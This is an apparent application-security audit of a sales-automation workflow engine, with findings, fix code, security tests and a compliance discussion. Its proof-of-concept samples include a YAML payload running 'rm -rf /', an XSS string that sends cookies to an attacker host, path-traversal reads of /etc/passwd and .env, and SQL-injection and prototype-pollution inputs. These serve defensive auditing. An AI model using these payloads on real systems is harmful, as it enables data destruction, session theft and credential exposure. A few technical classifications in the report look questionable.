# B-MAD Workflow Integration - Security Audit Report

**Date:** 2025-11-22
**Auditor:** Application Security Specialist
**System:** Sales Automation API - B-MAD Workflow Engine Integration
**Severity Scale:** CRITICAL | HIGH | MEDIUM | LOW

---

## Executive Summary

**Overall Risk Rating: HIGH**

The B-MAD workflow integration contains **4 CRITICAL** and **2 HIGH** severity vulnerabilities that must be addressed before production deployment. This is a sales automation system handling sensitive customer data (emails, phone numbers, names, company information) and API credentials for third-party services (Explorium, Lemlist, HubSpot).

### Critical Findings Summary

| ID | Severity | Issue | Impact | Status |
|----|----------|-------|--------|--------|
| BMAD-001 | **CRITICAL** | Unsafe YAML Loading (RCE) | Arbitrary code execution | OPEN |
| BMAD-002 | **CRITICAL** | PII Exposure via console.log | Data breach, GDPR violation | OPEN |
| BMAD-003 | **CRITICAL** | No Input Validation (14+ actions) | Injection attacks, data corruption | OPEN |
| BMAD-004 | **CRITICAL** | Workflow Path Traversal | Unauthorized file access | OPEN |
| BMAD-005 | **HIGH** | Missing Secure Logger Integration | PII leakage in logs | OPEN |
| BMAD-006 | **HIGH** | No API Key Management | Credential exposure | OPEN |

---

## Detailed Vulnerability Analysis

### BMAD-001: Unsafe YAML Loading - Remote Code Execution (CRITICAL)

**File:** `/home/omar/claude - sales_auto_skill/mcp-server/src/bmad/WorkflowEngine.ts`
**Line:** 25
**CWE:** CWE-502 (Deserialization of Untrusted Data)

#### Vulnerability

```typescript
// VULNERABLE CODE - Line 25
const doc: any = yaml.load(fileContents);
```

The code uses `yaml.load()` from the `js-yaml` library without schema restrictions. This allows arbitrary JavaScript code execution through specially crafted YAML files.

#### Proof of Concept

An attacker could create a malicious workflow YAML file:

```yaml
workflow:
  metadata:
    name: malicious
  steps:
    - id: exploit
      action: !!js/function >
        function() {
          require('child_process').execSync('rm -rf /');
        }()
```

#### Impact

- **Remote Code Execution (RCE)** on the server
- Complete system compromise
- Data exfiltration (customer PII, API keys, database credentials)
- Lateral movement to connected services (HubSpot, Explorium, Lemlist)

#### Remediation

Replace `yaml.load()` with safe schema:

```typescript
// SECURE IMPLEMENTATION
import * as yaml from 'js-yaml';

const doc: any = yaml.load(fileContents, {
  schema: yaml.JSON_SCHEMA,  // Only allows JSON-compatible types
  json: true                  // Strict JSON mode
});
```

**Alternative:** Use the `yaml` package (already in dependencies) which is safer by default:

```typescript
import { parse } from 'yaml';

const doc = parse(fileContents);  // Safe by default, no code execution
```

---

### BMAD-002: PII Exposure via Unredacted Logging (CRITICAL)

**File:** `/home/omar/claude - sales_auto_skill/mcp-server/src/bmad/ToolRegistry.ts`
**Lines:** 15, 32, 43, 52, 68, 80, 97, 107, 118, 129, 139, 149, 157, 165
**CWE:** CWE-532 (Insertion of Sensitive Information into Log File)
**GDPR:** Article 32 (Security of Processing), Article 5 (Data Protection Principles)

#### Vulnerability

**14 instances** of `console.log()` directly logging sensitive customer data without sanitization:

```typescript
// CRITICAL - Line 15
this.register('create_icp_profile', async (inputs) => {
  console.log("🎯 Creating ICP profile with:", inputs);  // LOGS RAW INPUTS
  return { ... };
});

// CRITICAL - Line 43
this.register('extract_contacts', async (inputs) => {
  console.log("👥 Extracting contacts from companies:", inputs);  // LOGS COMPANY DATA
  return [
    { first_name: "John", last_name: "Doe", title: "CTO",
      email: "john.doe@techcorp.com", company: "TechCorp Inc" },  // PII IN LOGS
    ...
  ];
});
```

#### Impact

**PII Exposed in Logs:**
- Email addresses (GDPR Article 4.1 - Personal Data)
- Full names (first_name, last_name)
- Phone numbers
- LinkedIn URLs
- Company affiliations
- Job titles

**Compliance Violations:**
- **GDPR Article 32:** Failure to implement appropriate technical measures
- **GDPR Article 5(1)(f):** Integrity and confidentiality principle violated
- **CCPA:** Unreasonable security procedures

**Business Impact:**
- Regulatory fines (up to 4% of global revenue under GDPR)
- Data breach notifications required
- Reputational damage
- Customer trust loss

#### Remediation

The codebase already has an **enterprise-grade secure logger** at `/home/omar/claude - sales_auto_skill/mcp-server/src/utils/logger.js` with:

- **Automatic PII redaction** for 40+ sensitive patterns
- Email masking
- Phone number redaction
- API key sanitization
- Prototype pollution protection

**Replace ALL `console.log` statements:**

```typescript
// SECURE IMPLEMENTATION
import { createLogger } from '../utils/logger.js';

const logger = createLogger('ToolRegistry');

this.register('create_icp_profile', async (inputs) => {
  logger.info('Creating ICP profile', { inputs });  // Auto-redacts PII
  return { ... };
});

this.register('extract_contacts', async (inputs) => {
  logger.info('Extracting contacts from companies', { inputs });  // Redacts emails, phones
  return contacts;  // Don't log the actual contact data
});
```

**Locations requiring fixes:**
1. Line 15: `create_icp_profile`
2. Line 32: `execute_company_search`
3. Line 43: `extract_contacts`
4. Line 52: `enrich_with_explorium`
5. Line 68: `calculate_icp_score`
6. Line 80: `segment_prospects`
7. Line 97: `quality_assurance_check`
8. Line 107: `setup_lemlist_campaign`
9. Line 118: `sync_contacts_to_crm`
10. Line 129: `create_discovery_summary`
11. Line 139: `analyze_engagement_patterns`
12. Line 149: `generate_personalized_message`
13. Line 157: `send_outreach_email`
14. Line 165: `schedule_follow_up`

---

### BMAD-003: No Input Validation on Workflow Actions (CRITICAL)

**File:** `/home/omar/claude - sales_auto_skill/mcp-server/src/bmad/ToolRegistry.ts`
**Lines:** 14-170 (All 14 actions)
**CWE:** CWE-20 (Improper Input Validation)

#### Vulnerability

**None of the 14 registered workflow actions validate their inputs** using Zod schemas. The existing codebase has comprehensive Zod validation (see `/home/omar/claude - sales_auto_skill/mcp-server/src/validators/complete-schemas.js`), but the B-MAD integration bypasses it entirely.

```typescript
// VULNERABLE - No validation
this.register('create_icp_profile', async (inputs) => {
  // inputs.market_segment could be:
  // - undefined
  // - malicious object with __proto__
  // - XSS payload: "<script>alert('xss')</script>"
  // - SQL injection: "'; DROP TABLE contacts; --"
  return {
    icp_profile: {
      firmographic_criteria: inputs.market_segment,  // UNVALIDATED
      ...
    }
  };
});
```

#### Impact

**Attack Vectors:**

1. **Prototype Pollution:**
```javascript
{
  "__proto__": { "isAdmin": true },
  "market_segment": "SaaS"
}
```

2. **XSS via Stored Data:**
```javascript
{
  "market_segment": "<script>fetch('https://attacker.com/steal?data='+document.cookie)</script>"
}
```

3. **Type Confusion:**
```javascript
{
  "contact_list": "not-an-array",  // Expected array, causes crashes
  "delay_hours": "infinity"        // Expected number
}
```

4. **Data Corruption:**
```javascript
{
  "step_number": -999,
  "icp_score": 99999999
}
```

#### Remediation

Create Zod validation schemas for all workflow action inputs:

```typescript
import { z } from 'zod';
import { SafeStringSchema, SafeJSONBSchema } from '../validators/complete-schemas.js';
import { createLogger } from '../utils/logger.js';

const logger = createLogger('ToolRegistry');

// Define schemas
const ICPProfileInputSchema = z.object({
  market_segment: z.object({
    industry: z.array(SafeStringSchema).min(1).max(10),
    geography: z.array(SafeStringSchema).min(1).max(20),
    company_size: SafeStringSchema.regex(/^\d+-\d+$/),
    revenue_range: SafeStringSchema
  }),
  target_personas: z.object({
    titles: z.array(SafeStringSchema).min(1).max(20),
    seniority: z.array(SafeStringSchema),
    departments: z.array(SafeStringSchema)
  }).optional(),
  signals: SafeJSONBSchema.optional()
});

const ContactListSchema = z.array(
  z.object({
    first_name: SafeStringSchema.min(1).max(100),
    last_name: SafeStringSchema.min(1).max(100),
    email: z.string().email().max(254),
    title: SafeStringSchema.max(200),
    company: SafeStringSchema.max(200)
  })
).max(10000);  // Prevent DoS attacks

// Secure registration with validation
this.register('create_icp_profile', async (inputs) => {
  const validated = ICPProfileInputSchema.parse(inputs);  // Throws on invalid
  logger.info('Creating ICP profile', { validated });

  return {
    icp_profile: {
      firmographic_criteria: validated.market_segment,
      ...
    }
  };
});

this.register('extract_contacts', async (inputs) => {
  const validated = z.object({
    company_list: z.array(z.any()).max(1000)
  }).parse(inputs);

  logger.info('Extracting contacts', { companyCount: validated.company_list.length });

  // Process and return validated contacts
  const contacts = processContacts(validated.company_list);
  return ContactListSchema.parse(contacts);  // Validate outputs too
});
```

**Required schemas for all 14 actions:**
1. `ICPProfileInputSchema` - create_icp_profile
2. `CompanySearchInputSchema` - execute_company_search
3. `ExtractContactsInputSchema` - extract_contacts
4. `EnrichContactsInputSchema` - enrich_with_explorium
5. `CalculateScoreInputSchema` - calculate_icp_score
6. `SegmentProspectsInputSchema` - segment_prospects
7. `QualityCheckInputSchema` - quality_assurance_check
8. `LemlistCampaignInputSchema` - setup_lemlist_campaign
9. `CRMSyncInputSchema` - sync_contacts_to_crm
10. `ReportInputSchema` - create_discovery_summary
11. `EngagementAnalysisInputSchema` - analyze_engagement_patterns
12. `MessageGenerationInputSchema` - generate_personalized_message
13. `EmailSendInputSchema` - send_outreach_email
14. `FollowUpInputSchema` - schedule_follow_up

---

### BMAD-004: Workflow Path Traversal Vulnerability (CRITICAL)

**File:** `/home/omar/claude - sales_auto_skill/mcp-server/src/bmad/WorkflowEngine.ts`
**Line:** 18
**CWE:** CWE-22 (Path Traversal)

#### Vulnerability

```typescript
// VULNERABLE - Line 16-18
async runWorkflow(workflowName: string, initialInputs: any) {
  console.log(`🚀 Starting Workflow: ${workflowName}`);
  const workflowPath = path.join(this.rootPath, 'workflows', `${workflowName}.workflow.yaml`);
  // No validation on workflowName - allows path traversal
```

#### Proof of Concept

```javascript
const engine = new WorkflowEngine();

// Attack 1: Read /etc/passwd
await engine.runWorkflow('../../../../../../../etc/passwd', {});

// Attack 2: Read database credentials
await engine.runWorkflow('../../.env', {});

// Attack 3: Read application secrets
await engine.runWorkflow('../../../src/config/secrets.json', {});
```

#### Impact

- **Unauthorized file access** to any file on the system
- **Credential theft** (.env files, database configs)
- **Source code disclosure**
- **System reconnaissance** (reading system files)

#### Remediation

```typescript
import { createLogger } from '../utils/logger.js';
import { SafeStringSchema } from '../validators/complete-schemas.js';

const logger = createLogger('WorkflowEngine');

// Whitelist of allowed workflow names
const ALLOWED_WORKFLOWS = [
  'prospect-discovery',
  're-engagement',
  'dynamic-outreach'
];

async runWorkflow(workflowName: string, initialInputs: any) {
  // Validate workflow name (alphanumeric, hyphens only)
  const validatedName = z.string()
    .regex(/^[a-z0-9-]+$/, 'Invalid workflow name')
    .min(1)
    .max(100)
    .parse(workflowName);

  // Whitelist check
  if (!ALLOWED_WORKFLOWS.includes(validatedName)) {
    logger.error('Attempted to run unauthorized workflow', { workflowName: validatedName });
    throw new Error(`Workflow not found: ${validatedName}`);
  }

  logger.info('Starting workflow', { workflowName: validatedName });

  const workflowPath = path.join(this.rootPath, 'workflows', `${validatedName}.workflow.yaml`);

  // Verify path is within allowed directory
  const resolvedPath = path.resolve(workflowPath);
  const rootDir = path.resolve(this.rootPath, 'workflows');

  if (!resolvedPath.startsWith(rootDir)) {
    logger.error('Path traversal attempt detected', { workflowPath, resolvedPath });
    throw new Error('Invalid workflow path');
  }

  // ... rest of implementation
}
```

---

### BMAD-005: Missing Secure Logger Integration (HIGH)

**File:** `/home/omar/claude - sales_auto_skill/mcp-server/src/bmad/WorkflowEngine.ts`
**Lines:** 17, 38, 43, 50, 52

#### Vulnerability

WorkflowEngine uses raw `console.log` instead of the secure logger:

```typescript
// Line 17
console.log(`🚀 Starting Workflow: ${workflowName}`);  // May contain user input

// Line 38
console.log(`\n📍 Step: ${step.id} [Agent: ${step.agent}]`);  // Unvalidated

// Line 43
console.warn(`⚠️ Tool '${step.action}' not found. Skipping.`);  // Tool name from YAML

// Line 52
console.error(`❌ Error in ${step.id}:`, error);  // May leak sensitive error details
```

#### Impact

- **PII in log files** (workflow names may contain customer identifiers)
- **Error message information disclosure** (stack traces with secrets)
- **Lack of audit trail** (no structured logging for compliance)

#### Remediation

```typescript
import { createLogger } from '../utils/logger.js';

export class WorkflowEngine {
  private logger = createLogger('WorkflowEngine');

  async runWorkflow(workflowName: string, initialInputs: any) {
    this.logger.info('Starting workflow', { workflowName });  // Auto-sanitized
    // ...
  }

  private async executeStep(step: any, previousStepId: string | null) {
    this.logger.info('Executing workflow step', {
      stepId: step.id,
      agent: step.agent,
      action: step.action
    });

    try {
      const result = await toolFn(inputs);
      this.context[step.id] = result;
      this.logger.info('Step completed successfully', { stepId: step.id });
    } catch (error) {
      this.logger.error('Step execution failed', {
        stepId: step.id,
        action: step.action,
        error: error.message  // Don't log full error (may contain PII)
      });
      throw error;
    }
  }
}
```

---

### BMAD-006: No API Key Management Integration (HIGH)

**File:** `/home/omar/claude - sales_auto_skill/mcp-server/src/bmad/ToolRegistry.ts`
**Lines:** 31-39, 106-115, 117-127

#### Vulnerability

Workflow actions that call external APIs (Explorium, Lemlist, HubSpot) have **hardcoded TODO comments** and no credential management:

```typescript
// Line 31-34
this.register('execute_company_search', async (inputs) => {
  console.log("🔎 Searching companies with Explorium:", inputs);
  // TODO: Connect to actual Explorium API
  // Return just the company_list as that's what the workflow expects
```

When implemented, these will need secure API key management.

#### Impact

**If implemented insecurely:**
- Hardcoded API keys in source code
- API keys in version control
- Credentials in logs
- No key rotation capability
- Credential theft via memory dumps

#### Remediation

The codebase has **ProviderConfig pattern** at `/home/omar/claude - sales_auto_skill/mcp-server/src/config/provider-config.js`. Use it:

```typescript
import { providerConfig } from '../config/provider-config.js';
import { createLogger } from '../utils/logger.js';
import axios from 'axios';

const logger = createLogger('ToolRegistry');

this.register('execute_company_search', async (inputs) => {
  const validated = CompanySearchInputSchema.parse(inputs);
  logger.info('Executing company search', {
    dataSource: 'explorium',
    maxResults: validated.search_params?.max_results
  });

  // Secure API key retrieval
  const apiKey = providerConfig.getProviderApiKey('explorium');
  const apiUrl = providerConfig.getProviderApiUrl('explorium');

  if (!apiKey) {
    throw new Error('Explorium API key not configured');
  }

  try {
    const response = await axios.post(`${apiUrl}/companies/search`, {
      query: validated.icp_profile,
      limit: validated.search_params?.max_results || 1000
    }, {
      headers: {
        'Authorization': `Bearer ${apiKey}`,  // Never logged
        'Content-Type': 'application/json'
      }
    });

    logger.info('Company search completed', {
      companiesFound: response.data.length
    });

    return response.data;
  } catch (error) {
    logger.error('Company search failed', {
      error: error.message  // Don't log request details (contain API key)
    });
    throw error;
  }
});
```

**Required for:**
1. `execute_company_search` - Explorium
2. `extract_contacts` - Explorium
3. `enrich_with_explorium` - Explorium
4. `setup_lemlist_campaign` - Lemlist
5. `sync_contacts_to_crm` - HubSpot

---

## Additional Security Concerns (MEDIUM)

### BMAD-007: Type Safety - Missing TypeScript Interfaces (MEDIUM)

**File:** `/home/omar/claude - sales_auto_skill/mcp-server/src/bmad/ToolRegistry.ts`
**Issue:** `type ToolFunction = (inputs: any) => Promise<any>;`

Using `any` defeats TypeScript's type safety. Should define proper interfaces:

```typescript
interface ICPProfileInput {
  market_segment: MarketSegment;
  target_personas?: TargetPersonas;
  signals?: Record<string, any>;
}

interface ICPProfileOutput {
  icp_profile: {
    firmographic_criteria: Record<string, any>;
    technographic_criteria: Array<string>;
    behavioral_criteria: Record<string, any>;
    scoring_weights: ScoringWeights;
  };
  quality_thresholds: QualityThresholds;
}

type ToolFunction<I = unknown, O = unknown> = (inputs: I) => Promise<O>;
```

---

### BMAD-008: Error Handling - Information Disclosure (MEDIUM)

**File:** `/home/omar/claude - sales_auto_skill/mcp-server/src/bmad/WorkflowEngine.ts`
**Line:** 53

```typescript
} catch (error) {
  console.error(`❌ Error in ${step.id}:`, error);  // Logs full error object
  throw error;  // Re-throws original error
}
```

**Issue:** Full error objects may contain:
- Database connection strings
- API keys from failed requests
- Internal file paths
- Stack traces with code structure

**Fix:**
```typescript
} catch (error) {
  this.logger.error('Step execution failed', {
    stepId: step.id,
    action: step.action,
    errorMessage: error.message,
    errorCode: error.code
  });

  // Throw sanitized error
  throw new Error(`Workflow step "${step.id}" failed: ${error.message}`);
}
```

---

### BMAD-009: ReDoS - Regex in resolveInputs (LOW)

**File:** `/home/omar/claude - sales_auto_skill/mcp-server/src/bmad/WorkflowEngine.ts`
**Line:** 68

```typescript
else if (value.startsWith('from_')) {
  const sourceStepId = value.replace('from_step_', '').replace('from_', '');
```

Low risk, but could be exploited with deeply nested values. Consider using `startsWith()` checks instead of regex.

---

## OWASP Top 10 Compliance Check

| OWASP Category | Status | Notes |
|----------------|--------|-------|
| A01:2021 - Broken Access Control | **FAIL** | Path traversal (BMAD-004), no authorization checks |
| A02:2021 - Cryptographic Failures | **FAIL** | PII in logs (BMAD-002), no encryption at rest |
| A03:2021 - Injection | **FAIL** | No input validation (BMAD-003), YAML RCE (BMAD-001) |
| A04:2021 - Insecure Design | **FAIL** | No security requirements, missing threat model |
| A05:2021 - Security Misconfiguration | **FAIL** | Unsafe YAML defaults, console.log in production |
| A06:2021 - Vulnerable Components | **PASS** | Dependencies appear up-to-date |
| A07:2021 - Identity/Auth Failures | **N/A** | No authentication implemented yet |
| A08:2021 - Software/Data Integrity | **FAIL** | Unsafe deserialization (YAML) |
| A09:2021 - Logging/Monitoring Failures | **FAIL** | No structured logging, PII in logs |
| A10:2021 - Server-Side Request Forgery | **N/A** | No user-controlled URLs yet |

**Compliance Score: 2/10 (CRITICAL RISK)**

---

## Remediation Roadmap

### Phase 1: CRITICAL FIXES (Immediate - 1-2 days)

**Priority 1 - Must fix before any deployment:**

1. **Fix YAML RCE (BMAD-001)**
   - Replace `yaml.load()` with `yaml.load(data, { schema: yaml.JSON_SCHEMA })`
   - Or switch to `yaml` package instead of `js-yaml`
   - **Estimated time:** 30 minutes

2. **Replace all console.log with secure logger (BMAD-002)**
   - Import `createLogger` from `../utils/logger.js`
   - Replace 14 instances in ToolRegistry.ts
   - Replace 5 instances in WorkflowEngine.ts
   - **Estimated time:** 2 hours

3. **Add path validation (BMAD-004)**
   - Implement workflow name whitelist
   - Add path traversal protection
   - **Estimated time:** 1 hour

### Phase 2: HIGH PRIORITY (Next 3-5 days)

4. **Implement Input Validation (BMAD-003)**
   - Create Zod schemas for all 14 action inputs
   - Add validation to each `register()` call
   - Test with malicious inputs
   - **Estimated time:** 8 hours

5. **Integrate ProviderConfig (BMAD-006)**
   - Replace TODO comments with actual API implementations
   - Use ProviderConfig for all API credentials
   - Test with real API keys from environment
   - **Estimated time:** 4 hours

### Phase 3: HARDENING (Week 2)

6. **Add TypeScript interfaces (BMAD-007)**
   - Define input/output types for all actions
   - Replace `any` types with proper interfaces
   - **Estimated time:** 4 hours

7. **Improve error handling (BMAD-008)**
   - Sanitize error messages
   - Add structured error codes
   - **Estimated time:** 2 hours

8. **Add unit tests for security**
   - Test YAML schema validation
   - Test path traversal protection
   - Test input validation edge cases
   - **Estimated time:** 8 hours

---

## Code Fixes

### Fix 1: WorkflowEngine.ts - Safe YAML Loading

**File:** `/home/omar/claude - sales_auto_skill/mcp-server/src/bmad/WorkflowEngine.ts`

```typescript
import * as fs from 'fs';
import * as path from 'path';
import * as yaml from 'js-yaml';
import { z } from 'zod';
import { ToolRegistry } from './ToolRegistry';
import { createLogger } from '../utils/logger.js';

const logger = createLogger('WorkflowEngine');

// Whitelist of allowed workflows
const ALLOWED_WORKFLOWS = ['prospect-discovery', 're-engagement', 'dynamic-outreach'];

export class WorkflowEngine {
  private registry: ToolRegistry;
  private rootPath: string;
  private context: any = {};

  constructor() {
    this.registry = new ToolRegistry();
    this.rootPath = path.join(process.cwd(), 'bmad-library', 'modules', 'sales');
  }

  async runWorkflow(workflowName: string, initialInputs: any) {
    // SECURITY FIX: Validate workflow name
    const validatedName = z.string()
      .regex(/^[a-z0-9-]+$/, 'Workflow name must be alphanumeric with hyphens')
      .min(1)
      .max(100)
      .parse(workflowName);

    // SECURITY FIX: Whitelist check
    if (!ALLOWED_WORKFLOWS.includes(validatedName)) {
      logger.error('Unauthorized workflow access attempt', { workflowName: validatedName });
      throw new Error(`Workflow not found: ${validatedName}`);
    }

    logger.info('Starting workflow execution', { workflowName: validatedName });

    const workflowPath = path.join(this.rootPath, 'workflows', `${validatedName}.workflow.yaml`);

    // SECURITY FIX: Verify path is within allowed directory
    const resolvedPath = path.resolve(workflowPath);
    const rootDir = path.resolve(this.rootPath, 'workflows');

    if (!resolvedPath.startsWith(rootDir)) {
      logger.error('Path traversal attempt detected', {
        workflowName: validatedName,
        attemptedPath: resolvedPath
      });
      throw new Error('Invalid workflow path');
    }

    if (!fs.existsSync(workflowPath)) {
      logger.error('Workflow file not found', { workflowPath });
      throw new Error(`Workflow file not found: ${validatedName}`);
    }

    const fileContents = fs.readFileSync(workflowPath, 'utf8');

    // SECURITY FIX: Safe YAML loading with JSON schema
    const doc: any = yaml.load(fileContents, {
      schema: yaml.JSON_SCHEMA,  // Prevents code execution
      json: true                  // Strict JSON compatibility
    });

    const steps = doc.workflow.steps;
    this.context = { ...initialInputs };

    let previousStepId: string | null = null;
    for (const step of steps) {
      await this.executeStep(step, previousStepId);
      previousStepId = step.id;
    }
    return this.context;
  }

  private async executeStep(step: any, previousStepId: string | null) {
    logger.info('Executing workflow step', {
      stepId: step.id,
      agent: step.agent,
      action: step.action
    });

    const inputs = this.resolveInputs(step.inputs, previousStepId);
    const toolFn = this.registry.getTool(step.action);

    if (!toolFn) {
      logger.warn('Tool not found, skipping step', {
        stepId: step.id,
        action: step.action
      });
      return;
    }

    try {
      const result = await toolFn(inputs);
      this.context[step.id] = result;
      logger.info('Step completed successfully', { stepId: step.id });
    } catch (error) {
      logger.error('Step execution failed', {
        stepId: step.id,
        action: step.action,
        errorMessage: error.message
      });
      // Throw sanitized error
      throw new Error(`Workflow step "${step.id}" failed: ${error.message}`);
    }
  }

  private resolveInputs(yamlInputs: any, previousStepId: string | null): any {
    if (!yamlInputs) return {};
    const resolved: any = {};

    for (const [key, value] of Object.entries(yamlInputs)) {
      if (typeof value === 'string') {
        if (value === 'from_previous_step' && previousStepId) {
          resolved[key] = this.context[previousStepId];
        }
        else if (value.startsWith('from_')) {
          const sourceStepId = value.replace('from_step_', '').replace('from_', '');

          if (sourceStepId.includes('.')) {
            const [stepId, prop] = sourceStepId.split('.');
            resolved[key] = this.context[stepId]?.[prop];
          } else {
            resolved[key] = this.context[sourceStepId];
          }
        } else {
          resolved[key] = value;
        }
      } else if (Array.isArray(value)) {
        resolved[key] = value.map(item =>
          typeof item === 'object' ? this.resolveInputs(item, previousStepId) : item
        );
      } else if (typeof value === 'object' && value !== null) {
        resolved[key] = this.resolveInputs(value, previousStepId);
      } else {
        resolved[key] = value;
      }
    }
    return resolved;
  }
}
```

---

### Fix 2: ToolRegistry.ts - Secure Logging and Validation (Partial Example)

**File:** `/home/omar/claude - sales_auto_skill/mcp-server/src/bmad/ToolRegistry.ts`

```typescript
import { z } from 'zod';
import { SafeStringSchema, SafeJSONBSchema } from '../validators/complete-schemas.js';
import { createLogger } from '../utils/logger.js';

const logger = createLogger('ToolRegistry');

type ToolFunction = (inputs: any) => Promise<any>;

// SECURITY: Define input schemas
const ICPProfileInputSchema = z.object({
  market_segment: z.object({
    industry: z.array(SafeStringSchema).min(1).max(10).optional(),
    geography: z.array(SafeStringSchema).min(1).max(20).optional(),
    company_size: SafeStringSchema.regex(/^\d+-\d+$/).optional(),
    revenue_range: SafeStringSchema.optional()
  }).optional(),
  target_personas: z.object({
    titles: z.array(SafeStringSchema).min(1).max(20).optional(),
    seniority: z.array(SafeStringSchema).optional(),
    departments: z.array(SafeStringSchema).optional()
  }).optional(),
  signals: SafeJSONBSchema.optional()
});

const CompanySearchInputSchema = z.object({
  icp_profile: z.any(),
  data_sources: z.array(z.string()).optional(),
  search_params: z.object({
    max_results: z.number().int().min(1).max(10000).optional(),
    exclude_existing_customers: z.boolean().optional(),
    exclude_active_prospects: z.boolean().optional()
  }).optional()
});

const ContactListSchema = z.array(
  z.object({
    first_name: SafeStringSchema.min(1).max(100),
    last_name: SafeStringSchema.min(1).max(100),
    title: SafeStringSchema.max(200),
    email: z.string().email().max(254),
    company: SafeStringSchema.max(200)
  })
).max(10000);

export class ToolRegistry {
  private tools: Map<string, ToolFunction> = new Map();

  constructor() {
    this.registerCoreTools();
  }

  private registerCoreTools() {
    // SECURITY FIX: Add validation and secure logging

    this.register('create_icp_profile', async (inputs) => {
      const validated = ICPProfileInputSchema.parse(inputs);
      logger.info('Creating ICP profile', {
        hasMarketSegment: !!validated.market_segment,
        hasPersonas: !!validated.target_personas
      });

      return {
        icp_profile: {
          firmographic_criteria: validated.market_segment || {},
          technographic_criteria: validated.signals?.tech_stack || [],
          behavioral_criteria: validated.signals || {},
          scoring_weights: { firmographic: 40, technographic: 30, behavioral: 20, intent: 10 }
        },
        quality_thresholds: {
          auto_approve: 85,
          review_queue: 70,
          disqualify: 70
        }
      };
    });

    this.register('execute_company_search', async (inputs) => {
      const validated = CompanySearchInputSchema.parse(inputs);
      logger.info('Executing company search', {
        dataSource: 'explorium',
        maxResults: validated.search_params?.max_results || 1000
      });

      // TODO: Implement with ProviderConfig
      // const apiKey = providerConfig.getProviderApiKey('explorium');

      return [
        { name: "TechCorp Inc", domain: "techcorp.com", industry: "SaaS", employee_count: 150 },
        { name: "DataFlow Systems", domain: "dataflow.io", industry: "SaaS", employee_count: 200 }
      ];
    });

    this.register('extract_contacts', async (inputs) => {
      const validated = z.object({
        company_list: z.array(z.any()).max(1000)
      }).parse(inputs);

      logger.info('Extracting contacts', {
        companyCount: validated.company_list.length
      });

      const contacts = [
        { first_name: "John", last_name: "Doe", title: "CTO",
          email: "john.doe@techcorp.com", company: "TechCorp Inc" },
        { first_name: "Jane", last_name: "Smith", title: "VP Engineering",
          email: "jane.smith@dataflow.io", company: "DataFlow Systems" }
      ];

      // Validate outputs
      return ContactListSchema.parse(contacts);
    });

    this.register('enrich_with_explorium', async (inputs) => {
      const validated = z.object({
        contact_list: ContactListSchema
      }).parse(inputs);

      logger.info('Enriching contacts', {
        contactCount: validated.contact_list.length
      });

      const enriched = validated.contact_list.map((contact) => ({
        ...contact,
        email_verified: true,
        linkedin_url: `https://linkedin.com/in/${contact.first_name.toLowerCase()}-${contact.last_name.toLowerCase()}`,
        phone: "+1-555-0100"
      }));

      return enriched;
    });

    // TODO: Add validation and secure logging to remaining 10 actions:
    // - calculate_icp_score
    // - segment_prospects
    // - quality_assurance_check
    // - setup_lemlist_campaign
    // - sync_contacts_to_crm
    // - create_discovery_summary
    // - analyze_engagement_patterns
    // - generate_personalized_message
    // - send_outreach_email
    // - schedule_follow_up
  }

  register(name: string, fn: ToolFunction) {
    this.tools.set(name, fn);
    logger.debug('Registered workflow action', { actionName: name });
  }

  getTool(name: string) {
    return this.tools.get(name);
  }

  listTools(): string[] {
    return Array.from(this.tools.keys());
  }
}
```

---

## Testing Recommendations

### Security Test Cases

```javascript
// test-bmad-security.ts
import { WorkflowEngine } from './src/bmad/WorkflowEngine';
import { describe, it, expect } from '@jest/globals';

describe('B-MAD Security Tests', () => {
  describe('YAML RCE Prevention (BMAD-001)', () => {
    it('should reject YAML with code execution attempts', async () => {
      const maliciousWorkflow = `
        workflow:
          steps:
            - id: exploit
              action: !!js/function >
                function() { require('fs').unlinkSync('/tmp/test'); }()
      `;

      // Should throw on yaml.load with JSON_SCHEMA
      expect(() => {
        yaml.load(maliciousWorkflow, { schema: yaml.JSON_SCHEMA });
      }).toThrow();
    });
  });

  describe('Path Traversal Prevention (BMAD-004)', () => {
    it('should reject path traversal in workflow names', async () => {
      const engine = new WorkflowEngine();

      await expect(
        engine.runWorkflow('../../../etc/passwd', {})
      ).rejects.toThrow('Workflow name must be alphanumeric');

      await expect(
        engine.runWorkflow('../../.env', {})
      ).rejects.toThrow();
    });

    it('should only allow whitelisted workflows', async () => {
      const engine = new WorkflowEngine();

      await expect(
        engine.runWorkflow('malicious-workflow', {})
      ).rejects.toThrow('Workflow not found');
    });
  });

  describe('Input Validation (BMAD-003)', () => {
    it('should reject prototype pollution attempts', async () => {
      const registry = new ToolRegistry();
      const tool = registry.getTool('create_icp_profile');

      await expect(
        tool({
          __proto__: { isAdmin: true },
          market_segment: 'SaaS'
        })
      ).rejects.toThrow(); // Zod should reject __proto__
    });

    it('should sanitize XSS payloads', async () => {
      const registry = new ToolRegistry();
      const tool = registry.getTool('create_icp_profile');

      const result = await tool({
        market_segment: {
          industry: ['<script>alert("xss")</script>']
        }
      });

      // Should be sanitized by SafeStringSchema
      expect(result.icp_profile.firmographic_criteria.industry[0])
        .not.toContain('<script>');
    });
  });

  describe('PII Logging Prevention (BMAD-002)', () => {
    it('should not log raw PII data', async () => {
      const consoleSpy = jest.spyOn(console, 'log');

      const registry = new ToolRegistry();
      const tool = registry.getTool('extract_contacts');

      await tool({
        company_list: [{ name: 'Test Corp' }]
      });

      // Should use logger.info, not console.log
      expect(consoleSpy).not.toHaveBeenCalledWith(
        expect.stringContaining('@')
      );
    });
  });
});
```

---

## Compliance Impact

### GDPR Article Violations

| Article | Violation | Fine Exposure | Remediation |
|---------|-----------|---------------|-------------|
| Article 5(1)(f) | PII in logs (BMAD-002) | Up to €20M or 4% global revenue | Fix logging |
| Article 32 | No encryption, unsafe deserialization | Up to €10M or 2% global revenue | Fix YAML, encrypt data |
| Article 33/34 | Potential breach notification | Mandatory within 72 hours | Fix all CRITICAL issues |

### Regulatory Fines Risk

Based on similar violations in the EU:
- **British Airways (2019):** £20M for security failures leading to data breach
- **H&M (2020):** €35M for excessive data collection and inadequate security
- **Google (2019):** €50M for lack of transparency and inadequate consent

**This system's risk profile:** €5-15M potential fine if breached due to CRITICAL vulnerabilities.

---

## Conclusion

The B-MAD workflow integration has **4 CRITICAL vulnerabilities** that must be fixed immediately before any production deployment:

1. **YAML RCE (BMAD-001)** - Single-line fix, 30 minutes
2. **PII Logging (BMAD-002)** - 2 hours to replace console.log
3. **No Input Validation (BMAD-003)** - 8 hours to add Zod schemas
4. **Path Traversal (BMAD-004)** - 1 hour to add whitelist + validation

**Total remediation time: ~12 hours** for CRITICAL fixes.

